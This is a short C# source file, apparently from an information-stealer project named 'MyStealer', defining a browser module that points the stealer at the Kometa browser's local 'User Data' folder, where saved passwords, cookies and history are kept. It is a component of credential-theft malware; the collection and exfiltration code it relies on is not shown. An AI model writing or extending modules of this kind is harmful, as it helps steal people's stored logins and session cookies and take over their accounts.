using System.IO;
using System;

namespace MyStealer.Collector.Modules.Browser.ChromiumBased
{
    public class Kometa : Chromium
    {
        public override string ModuleName => "Kometa";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Kometa", "User Data");
    }
}
